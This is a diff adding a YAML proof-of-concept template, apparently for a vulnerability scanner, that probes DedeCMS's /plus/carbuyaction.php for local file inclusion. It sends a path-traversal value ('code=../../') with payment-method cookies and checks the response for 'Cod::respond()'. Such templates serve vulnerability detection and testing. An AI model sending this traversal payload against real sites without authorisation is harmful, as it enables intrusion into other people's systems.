@@ -1,0 +1,32 @@
+id: poc-yaml-dedecms-carbuyaction-fileinclude
+info:
+  name: Dedecms Carbuyaction 文件包含漏洞
+  severity: medium
+  tags:
+  - lfi
+  finger: DedeCMS
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /plus/carbuyaction.php?dopost=return&code=../../
+  headers:
+    Cookie: code=alipay
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200
+  output: []
+- method: GET
+  path: /plus/carbuyaction.php?dopost=return&code=../../
+  headers:
+    Cookie: code=cod
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "Cod::respond()")
+  output: []
